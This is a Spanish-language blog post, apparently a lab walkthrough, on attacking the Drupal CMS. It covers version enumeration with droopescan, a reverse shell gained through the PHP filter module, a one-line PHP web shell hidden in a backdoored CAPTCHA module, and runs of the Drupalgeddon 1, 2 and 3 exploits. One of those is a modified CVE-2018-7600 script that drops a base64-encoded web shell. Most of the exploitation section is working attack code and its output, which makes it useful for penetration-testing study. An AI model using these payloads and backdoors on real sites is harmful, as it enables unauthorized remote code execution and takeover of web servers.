---
date: 2025-11-06T00:15:05.000Z
layout: post
comments: true
title: "Hacking Drupal"
subtitle: 'Tipos de ataque'
description: >-
image: >-
  /images/drupallogo.png
optimized_image: >-
  /images/drupallogo.png
category: ciberseguridad
tags:
  - web
  - rce
  - owasp
  - drupal
  - php
  - cms
  - drupalgeddon
author: Felipe Canales Cayuqueo
paginate: true
---

Drupal es un sistema de gestión de contenidos (CMS) de código abierto escrito en PHP. Permite crear y administrar sitios web complejos mediante un núcleo flexible y una gran cantidad de módulos y temas que amplían funcionalidades (formularios, usuarios, taxonomías, e-commerce, APIs, etc.).



### Enumeración

#### Obtención de versión

Una de las formas de detectar la versión es consultando el archivo ```CHANGELOG.txt``` es decir http://test.local/CHANGELOG.txt.

#### Droopescan

[Droopescan](https://github.com/SamJoan/droopescan) es una herramienta de auditoría dirigida a gestores de contenidos (originalmente muy enfocada en Drupal, pero también soporta Wordpress, Joomla y otros).
En el contexto de Drupal, sirve para automatizar tareas de reconocimiento y detección rápida de posibles superficies de ataque. 

```
┌──(root㉿nptg)-[/drupal]
└─# droopescan scan drupal -u http://drupal-qa.inlanefreight.local 
[+] Plugins found:                                                              
    profile http://drupal-qa.inlanefreight.local/modules/profile/
    php http://drupal-qa.inlanefreight.local/modules/php/
    image http://drupal-qa.inlanefreight.local/modules/image/

[+] Themes found:
    seven http://drupal-qa.inlanefreight.local/themes/seven/
    garland http://drupal-qa.inlanefreight.local/themes/garland/

[+] Possible version(s):
    7.30

[+] Possible interesting urls found:
    Default changelog file - http://drupal-qa.inlanefreight.local/CHANGELOG.txt
    Default admin - http://drupal-qa.inlanefreight.local/user/login

[+] Scan finished (0:03:50.356192 elapsed)

```

#### Roles de los usuarios

- **Administrator**  
  Usuario con control total sobre el sitio, puede gestionar configuración, instalar/extender módulos, administrar usuarios y modificar cualquier contenido o ajuste del sistema.

- **Authenticated User**  
  Usuarios registrados y autenticados que pueden iniciar sesión y, según sus permisos, crear, editar o gestionar contenido propio o asignado (por ejemplo, agregar o editar artículos).

- **Anonymous**  
  Visitantes no autenticados. Por defecto solo tienen permiso de lectura (ver publicaciones y páginas públicas) y no pueden crear ni modificar contenido.


### Explotación

#### Módulo de filtro PHP

En versiones anteriores de Drupal (antes de la versión 8), era posible iniciar sesión como administrador y habilitar el módulo PHP filter el cual es una extensión que permite insertar y ejecutar código PHP directamente dentro del contenido del sitio (por ejemplo en nodos, bloques o filtros de texto).

Para aprovechar esta vulnerabilidad es necesario estar autenticado como administrador, como se muestra en este caso, y además que la instalación cumpla con la versión vulnerable.

[![drupal1](/images/drupal1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/drupal1.png)

Nos dirigimos a ```add content``` y seleccionamos ```basic page```.

[![drupal2](/images/drupal2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/drupal2.png)

Generamos la reverse shell.

[![drupal3](/images/drupal3.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/drupal3.png)

Al guardar, seremos redirigidos al directorio ```/node/3```.

```
┌──(root㉿nptg)-[/drupal]
└─# nc -nlvp 4646  
listening on [any] 4646 ...
connect to [10.10.14.13] from (UNKNOWN) [10.129.42.195] 56748
Linux app01 5.4.0-88-generic #99-Ubuntu SMP Thu Sep 23 17:29:00 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 23:24:50 up  1:03,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ ls -al
total 76
drwxr-xr-x  20 root root  4096 Sep 30  2021 .
drwxr-xr-x  20 root root  4096 Sep 30  2021 ..
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 29  2021 boot
drwxr-xr-x   2 root root  4096 Dec 15  2020 cdrom
drwxr-xr-x  19 root root  3980 Nov  3 22:21 dev
drwxr-xr-x  98 root root  4096 Sep 29  2021 etc
drwxr-xr-x   4 root root  4096 Sep 29  2021 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Dec 15  2020 lost+found
drwxr-xr-x   2 root root  4096 Apr 23  2020 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   2 root root  4096 Apr 23  2020 opt
dr-xr-xr-x 225 root root     0 Nov  3 22:21 proc
drwx------   6 root root  4096 Sep 30  2021 root
drwxr-xr-x  29 root root   860 Nov  3 22:21 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   7 root root  4096 Aug 16  2021 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
dr-xr-xr-x  13 root root     0 Nov  3 22:21 sys
drwxrwxrwt   2 root root  4096 Nov  3 22:21 tmp
drwxr-xr-x  15 root root  4096 Aug 16  2021 usr
drwxr-xr-x  14 root root  4096 Aug 16  2021 var
```

A partir de la versión 8, el módulo PHP filter no está instalado de forma predeterminada. Para aprovechar esta funcionalidad, tendríamos que instalar el módulo. 

Una vez descargado, vaya a Administration > Reports > Available updates.

#### Subir un módulo con backdoor

Drupal permite a los usuarios con los permisos adecuados cargar un nuevo módulo. Se puede crear un módulo con puerta trasera agregando un shell a un módulo existente. Para ello debemos descargar un modulo legítimo (CAPTCHA).

```
┌──(root㉿nptg)-[/drupal]
└─# wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz

┌──(root㉿nptg)-[/drupal]
└─# tar xvf captcha-8.x-1.2.tar.gz
```

creamos una shell dentro de la carpeta captcha.

```
┌──(root㉿nptg)-[/drupal/captcha]
└─# nano shell.php
<?=`$_GET[0]`?>
```

A continuación, necesitamos crear un archivo .htaccess para darnos acceso a la carpeta.

```
┌──(root㉿nptg)-[/drupal/captcha]
└─# nano .htaccess

<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

Retrocedemos un directorio hacia atrás y ejecutamos lo siguiente:

```
┌──(root㉿nptg)-[/drupal/captcha]
└─# cd ..

┌──(root㉿nptg)-[/drupal/]
└─# tar cvf captcha.tar.gz captcha/
```

Este nuevo archivo lo instalaremos como nuevo modulo en Manage, luego extend. O directamente consultando ```/admin/modules/install```.

[![drupal6](/images/drupal6.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/drupal6.png)


[![drupal4](/images/drupal4.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/drupal4.png)


Le damos a seleccionar archivo y subimos nuestro modulo de captcha malicioso e instalamos.

[![drupal5](/images/drupal5.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/drupal5.png)

Finalmente debemos navegar hasta ```/modules/captcha/shell.php?0=id```.

#### Drupalgeddon

Drupalgeddon son un grupo de vulnerabilidades que permiten ejecución remota de código (RCE) en drupal. 

* [CVE-2014-3704](https://www.exploit-db.com/exploits/34992): En Drupal 7 (versiones anteriores a la 7.32) la función ```expandArguments()``` (parte de la API de abstracción de base de datos) tiene un fallo en la forma en que transforma los arrays de argumentos en sentencias preparadas. Cuando ```expandArguments()``` recibe un array, intenta convertir sus elementos en marcadores (placeholders) y valores para la consulta; sin embargo, no valida ni “escapa” correctamente las claves del array que usa para construir esos placeholders. Un atacante que consiga controlar los contenidos de ese array (o haga que la aplicación lo construya con claves manipuladas) puede provocar que partes del SQL se inserten literalmente en la sentencia preparada en lugar de tratarse como datos, lo que permite realizar inyección SQL remota.

    Se ejecuta el exploit de la siguente forma:

    ```
    ┌──(root㉿nptg)-[/drupal/]
    └─# python2 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u usuariocreado -p passcreada

    ______                          __     _______  _______ _____    
    |   _  \ .----.--.--.-----.---.-|  |   |   _   ||   _   | _   |   
    |.  |   \|   _|  |  |  _  |  _  |  |   |___|   _|___|   |.|   |   
    |.  |    |__| |_____|   __|___._|__|      /   |___(__   `-|.  |   
    |:  1    /          |__|                 |   |  |:  1   | |:  |   
    |::.. . /                                |   |  |::.. . | |::.|   
    `------'                                 `---'  `-------' `---'   
    _______       __     ___       __            __   __             
    |   _   .-----|  |   |   .-----|__.-----.----|  |_|__.-----.-----.
    |   1___|  _  |  |   |.  |     |  |  -__|  __|   _|  |  _  |     |
    |____   |__   |__|   |.  |__|__|  |_____|____|____|__|_____|__|__|
    |:  1   |  |__|      |:  |    |___|                               
    |::.. . |            |::.|                                        
    `-------'            `---'                                        
                                                                    
                                    Drup4l => 7.0 <= 7.31 Sql-1nj3ct10n
                                                Admin 4cc0unt cr3at0r

                Discovered by:

                Stefan  Horst
                            (CVE-2014-3704)

                            Written by:

                            Claudio Viviani

                        http://www.homelab.it

                            info@homelab.it
                        homelabit@protonmail.ch

                    https://www.facebook.com/homelabit
                    https://twitter.com/homelabit
                    https://plus.google.com/+HomelabIt1/
        https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww


    [!] VULNERABLE!

    [!] Administrator user created!

    [*] Login: usuariocreado
    [*] Pass: passcreada
    [*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node
    ```

    [![drupal7](/images/drupal7.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/drupal7.png)

    [![drupal8](/images/drupal8.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/drupal8.png)


* [CVE-2018-7600](https://www.exploit-db.com/exploits/44448): También conocida como Drupalgeddon 2, es un fallo crítico en el núcleo de Drupal que permite a un atacante remoto sin autenticación ejecutar código arbitrario en sitios Drupal (versiones 7.x antes de la 7.58, y versiones 8.x antes de 8.3.9 / 8.4.6 / 8.5.1).

    ```
    ┌──(root㉿nptg)-[/drupal/]
    └─# python3 drupalgeddon2.py                                    
    ################################################################
    # Proof-Of-Concept for CVE-2018-7600
    # by Vitalii Rudnykh
    # Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
    # https://github.com/a2u/CVE-2018-7600
    ################################################################
    Provided only for educational or information purposes

    Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

    Check: http://drupal-dev.inlanefreight.local/hello.txt

    ```

    [![drupal9](/images/drupal9.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/drupal9.png)

    Se comprueba que es vulnerable por lo que podemos subir una shell editando el código de la siguiente forma.

    ```python
    #!/usr/bin/env
    import sys
    import requests

    print ('################################################################')
    print ('# Proof-Of-Concept for CVE-2018-7600')
    print ('# by Vitalii Rudnykh')
    print ('# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders')
    print ('# https://github.com/a2u/CVE-2018-7600')
    print ('################################################################')
    print ('Provided only for educational or information purposes\n')

    target = input('Enter target url (example: https://domain.ltd/): ')

    # Add proxy support (eg. BURP to analyze HTTP(s) traffic)
    # set verify = False if your proxy certificate is self signed
    # remember to set proxies both for http and https
    # 
    # example:
    # proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    # verify = False
    proxies = {}
    verify = True

    url = target + 'user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' 
    payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo "PD89YCRfR0VUWzBdYD8+Cg==" | base64 -d | tee exploit.php'}

    r = requests.post(url, proxies=proxies, data=payload, verify=verify)
    check = requests.get(target + 'exploit.php')
    if check.status_code != 200:
    sys.exit("Not exploitable")
    print ('\nCheck: '+target+'exploit.php')
    ```

    Para finalmente ejecutar nuevamente el exploit y dirigirnos a la shell.

    ```
    ┌──(root㉿nptg)-[/drupal/]
    └─# python3 drupalgeddon2.py  
    ################################################################
    # Proof-Of-Concept for CVE-2018-7600
    # by Vitalii Rudnykh
    # Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
    # https://github.com/a2u/CVE-2018-7600
    ################################################################
    Provided only for educational or information purposes

    Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

    Check: http://drupal-dev.inlanefreight.local/exploit.php
    ``` 

    [![drupal10](/images/drupal10.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/drupal10.png)

* [CVE-2018-7602](https://github.com/oways/SA-CORE-2018-004/): Drupalgeddon 3 es una vulnerabilidad crítica de ejecución remota de código (RCE). Afecta a múltiples subsistemas del núcleo de Drupal 7.x y 8.x, y permite que un atacante remoto autenticado ejecute código arbitrario en el servidor que aloja el sitio.

    Para esto necesitamos cumplir ciertas condiciones como obtener una sesión y copiarnos la cookie. En este caso capturaremos la petición con burpsuite tras realizar el login para poder recibir esta información.

    [![drupal11](/images/drupal11.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/drupal11.png)

    Luego necesitaremos un nodo existente el cual podremos obtener en las publicaciones.

    [![drupal12](/images/drupal12.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/drupal12.png)

    Una vez tenemos estos datos podemos ejecutar el exploit.

    ```
    ┌──(root㉿nptg)-[/drupal/]
    └─# python3 drupalgeddon3.py http://drupal-acc.inlanefreight.local/ "SESS45ecfcb93a827c3e578eae161f280548=ETsOzhbJnee9Kj5WuNKm17VGtsPcYmS48tPH1hPMyL8" 1 "ls"
    CHANGELOG.txt
    COPYRIGHT.txt
    INSTALL.mysql.txt
    INSTALL.pgsql.txt
    INSTALL.sqlite.txt
    INSTALL.txt
    LICENSE.txt
    MAINTAINERS.txt
    README.txt
    UPGRADE.txt
    authorize.php
    cron.php
    includes
    index.php
    install.php
    misc
    modules
    profiles
    robots.txt
    scripts
    sites
    themes
    update.php
    web.config
    xmlrpc.php
    ``` 

> Las direcciones URLs de los exploits se encuentran referenciados en cada punto haciendo click sobre los CVE.

